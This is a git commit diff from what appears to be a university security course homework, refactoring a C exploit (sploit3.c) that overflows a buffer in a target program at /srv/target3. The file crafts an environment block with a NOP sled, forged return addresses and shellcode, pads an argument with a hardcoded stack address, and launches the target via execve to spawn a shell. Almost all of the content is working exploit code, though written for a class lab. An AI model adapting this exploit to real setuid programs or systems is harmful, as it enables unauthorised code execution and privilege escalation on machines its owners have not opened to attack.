8d02f023905746625979a31d45bfa7929d4d5cdd
justinhalford <justinhalford@gmail.com>
2024-05-10 19:26:13 -0400

    may 7

--- cs5435-hw4/sploits/sploit3.c
+++ cs5435-hw4/sploits/sploit3.c
@@ -6,39 +6,40 @@
 #include "shellcode.h"
 
 #define TARGET "/srv/target3"
+#define ENV_SIZE 400
+#define NOP_SIZE 201
+#define BASE_ADDR 0xffffdec0
+#define RET_OFFSET 4
 
-const int ENV_SIZE = 400;
-const int NOP_SIZE = 201;
-const uint32_t BASE_ADDR = 0xffffdec0;
-const int RET_OFFSET = 4;
-
-void prepareEnv(char *env) {
-    memset(env, 0x90, ENV_SIZE - 1);
-    *((uint32_t *)(env)) = BASE_ADDR + RET_OFFSET;
-    *((uint32_t *)(env + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
-    memcpy(env + NOP_SIZE, shellcode, sizeof(shellcode));
-    env[ENV_SIZE - 1] = '\0';
+void craftEnv(char *e) {
+    memset(e, 0x90, ENV_SIZE - 1);
+    *((uint32_t *)(e)) = BASE_ADDR + RET_OFFSET;
+    *((uint32_t *)(e + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
+    memcpy(e + NOP_SIZE, shellcode, sizeof(shellcode));
+    e[ENV_SIZE - 1] = '\0';
 }
 
 int main(void) {
-    char *args[3];
+    char *argv[3];
     char *envp[2];
     char env[ENV_SIZE];
-    char padding[20];
+    char pad[20] = {0};
 
-    prepareEnv(env);
+    craftEnv(env);
 
-    memset(padding, 0x90, 16);
-    *((uint32_t *)(padding + 16)) = BASE_ADDR;
+    for (int i = 0; i < 16; i++) {
+        pad[i] = 0x90;
+    }
+    *((uint32_t *)(pad + 16)) = BASE_ADDR;
 
-    args[0] = TARGET;
-    args[1] = padding;
-    args[2] = NULL;
+    argv[0] = TARGET;
+    argv[1] = pad;
+    argv[2] = NULL;
 
     envp[0] = env;
     envp[1] = NULL;
 
-    execve(TARGET, args, envp);
+    execve(TARGET, argv, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
